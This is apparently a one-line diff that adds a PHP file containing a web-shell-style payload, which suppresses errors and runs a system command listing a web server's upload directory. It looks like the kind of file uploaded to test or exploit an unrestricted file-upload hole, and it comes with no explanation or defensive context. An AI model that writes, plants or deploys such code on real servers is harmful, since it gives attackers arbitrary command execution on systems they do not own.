@@ -1,0 +1,1 @@
+<?php @eval(system('ls /var/www/html/up/upload'));?>
